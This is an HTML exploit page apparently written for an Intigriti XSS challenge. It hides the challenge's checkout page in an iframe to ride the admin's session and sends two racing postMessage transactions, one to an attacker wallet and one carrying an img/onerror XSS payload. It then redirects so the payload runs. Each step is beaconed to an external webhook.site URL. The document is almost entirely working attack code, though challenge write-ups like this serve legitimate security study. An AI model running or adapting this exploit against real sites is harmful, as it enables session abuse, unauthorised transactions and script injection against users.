<!DOCTYPE html>
<html>
<head>
    <title>Intigriti XSS - Fixed Exploit</title>
    <meta charset="UTF-8">
    <style>body{font-family:monospace;background:#0a0a0a;color:#00ff00;padding:20px;}</style>
</head>
<body>
    <h1>INTIGRITI XSS EXPLOIT</h1>
    <div id="log">Loading...</div>

    <!-- Iframe inherits admin session via SameSite cookies -->
    <iframe id="checkout" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" style="display:none"></iframe>

    <script>
        const WEBHOOK = 'https://webhook.site/216ac4d3-e750-4c55-8bfc-d28981af6737';
        const YOUR_WALLET = '167ec746968ba8643f253d8f624b0ff8fd';
        const BASE = 'https://challenge-0126.intigriti.io';

        function log(msg) {
            document.getElementById('log').innerHTML += '<br>' + msg;
            console.log(msg);
        }

        function track(step, status, data = {}) {
            new Image().src = `${WEBHOOK}?step=${step}&status=${status}&ts=${Date.now()}&d=${encodeURIComponent(JSON.stringify(data))}`;
        }

        track('start', 'loaded', {});

        const iframe = document.getElementById('checkout');

        iframe.onload = function() {
            log('Iframe loaded with admin session');
            track('iframe_loaded', 'success', {});

            setTimeout(() => {
                log('Sending BOTH transactions instantly...');
                track('sending_both', 'start', {});

                const xssPayload = '<img src=x onerror="alert(\'gigawatz\');fetch(\'' + WEBHOOK + '?xss=1\',{mode:\'no-cors\'})">';

                // Send BOTH postMessages instantly (no delay between them)
                // Async handler processes both in parallel before redirect
                iframe.contentWindow.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: YOUR_WALLET,
                        currency: '1337COIN',
                        amount: 1
                    }
                }, '*');

                iframe.contentWindow.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: xssPayload,
                        currency: '1337COIN',
                        amount: 0
                    }
                }, '*');

                track('both_sent', 'done', { wallet: YOUR_WALLET, xss: xssPayload.substring(0, 50) });
                log('Both transactions sent!');
                log('TX #1: ' + YOUR_WALLET);
                log('TX #2: XSS payload');

                // Redirect to marketwatch to trigger XSS
                setTimeout(() => {
                    log('Redirecting to marketwatch...');
                    track('redirecting', 'to_marketwatch', {});
                    window.location.href = BASE + '/marketwatch.html';
                }, 5000);

            }, 8000); // Wait longer for checkout to fully load
        };

        iframe.onerror = function() {
            log('Iframe failed to load!');
            track('iframe_error', 'failed', {});
        };
    </script>
</body>
</html>
